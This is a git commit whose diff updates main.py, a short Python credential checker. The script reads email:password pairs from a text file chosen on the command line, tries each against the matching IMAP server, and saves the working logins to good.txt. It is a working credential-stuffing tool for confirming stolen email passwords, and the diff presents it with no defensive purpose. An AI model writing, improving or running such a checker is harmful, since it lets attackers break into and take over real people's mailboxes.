34ee7507af4603b8ac2e55ede8099b2f69004203
Sergey <46562501+Rikstone@users.noreply.github.com>
2019-03-06 19:51:58 +0500

    Added script's argument

--- main.py
+++ main.py
@@ -1,35 +1,50 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 # -*- coding: UTF-8 -*-
 
 import imaplib
+import argparse
+import sys
+import glob
 
+
+def createParser ():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('inputDirectory',choices=glob.glob('*.txt'),
+                    help='Path to the input directory.')
+ 
+    return parser
 
 def get_mail_list(path):
-	mail = []
-	with open(path,'r') as f:
-		for line in f:
-			mail.append(line.strip())
-	return mail
+    mail = []
+    with open(path,'r') as f:
+        for line in f:
+            mail.append(line.strip())
+
+    return mail
 
 def mail_auth(login,password):
-	try:
-		server = login.split('@')[1]
-		mail = imaplib.IMAP4_SSL('imap.'+server)
-		mail.login(login,password)
-		print('%s:%s' % (login,password))
-		with open('good.txt','a') as f:
-			f.write('%s:%s\n' % (login,password))
-		return True
-	except:
-		return False
+    try:
+        server = login.split('@')[1]
+        mail = imaplib.IMAP4_SSL('imap.'+server)
+        mail.login(login,password)
+
+        print('%s:%s' % (login,password)) # this is a good result
+
+        with open('good.txt','a') as f:
+            f.write('%s:%s\n' % (login,password))
+    except:
+        pass
 
 def main():
-	mail = get_mail_list('mail.txt')
-	for account in mail:
-		login = account.split(':')[0]
-		password = account.split(':')[1]
-		mail_auth(login,password)
+    parser = createParser()
+    namespace = parser.parse_args(sys.argv[1:])
+    mail = get_mail_list(namespace.inputDirectory)
+  
+    for account in mail:
+        login = account.split(':')[0]
+        password = account.split(':')[1]
+        mail_auth(login,password)
 
 
 if __name__ == '__main__':
-	main()
+    main()
